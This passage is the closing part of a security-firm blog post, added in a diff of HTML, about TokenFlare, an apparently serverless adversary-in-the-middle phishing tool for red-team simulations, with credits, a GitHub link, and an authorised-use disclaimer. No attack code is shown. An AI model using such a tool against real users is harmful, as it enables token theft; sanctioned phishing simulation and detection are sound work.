+<p>TokenFlare wouldn&rsquo;t exist without the contributions of several people:</p>
+<ul>
+<li><strong><a href="https://github.com/tdejmp">TE</a></strong> – For the debugging sessions, the teaching, and generally being an awesome human being throughout this project</li>
+<li><strong><a href="https://github.com/Cyb3rC3lt/">Dave @Cyb3rC3lt</a></strong> – For building our v1 internal production Worker that proved the concept at scale</li>
+<li><strong><a href="https://github.com/zolderio/">Zolderio</a></strong> – For the prototype PoC that started it all and showed us what was possible in under 200 lines of JavaScript</li>
+<li><strong>The JUMPSEC Adversarial Simulation team</strong> – For battle-testing this across dozens of engagements and providing the feedback that shaped the tool</li>
+</ul>
+<h2 id="final-words">Final Words<a href="#final-words" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>TokenFlare represents a shift in how we think about phishing simulation infrastructure. The complexity should be in your pretext and social engineering, not in your tooling. Cloud providers have solved the hard infrastructure problems - let them do that work while you focus on demonstrating real security gaps.</p>
+<p>If you&rsquo;re a red teamer or penetration tester running phishing simulations, give TokenFlare a try. If you&rsquo;re a defender, use the IoCs above to detect it - and consider whether your current detection capabilities would catch the less-friendly alternatives that don&rsquo;t announce themselves.</p>
+<p><strong>GitHub</strong>: <a href="https://github.com/JumpsecLabs/TokenFlare">https://github.com/JumpsecLabs/TokenFlare</a></p>
+<p>Questions, feedback, or war stories? Find me on Twitter/X at <a href="https://twitter.com/gladstomych">@gladstomych</a> or reach out via <a href="mailto:sunnyc@jumpsec.com">sunnyc@jumpsec.com</a>.</p>
+<hr>
+<p><strong>Disclaimer</strong>: TokenFlare is for authorised security testing only. Unauthorised use against systems you do not own or have explicit permission to test is illegal. Using CloudFlare&rsquo;s services for penetration testing third parties may violate their terms of service - consider yourself warned.</p>
+<hr>
+<p><em>Originally published on <a href="https://labs.jumpsec.com/tokenflare-serverless-AiTM-phishing-in-under-60-seconds/">JUMPSEC Labs</a></em></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h"></span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+    
+    
+      <a href="//localhost:1313/blog/cap-circumvention-webinar/" class="button inline next">
+         [<span class="button__text">Please Mind the CAP – Modern Conditional Access Policy Circumvention (Webinar Recording)</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
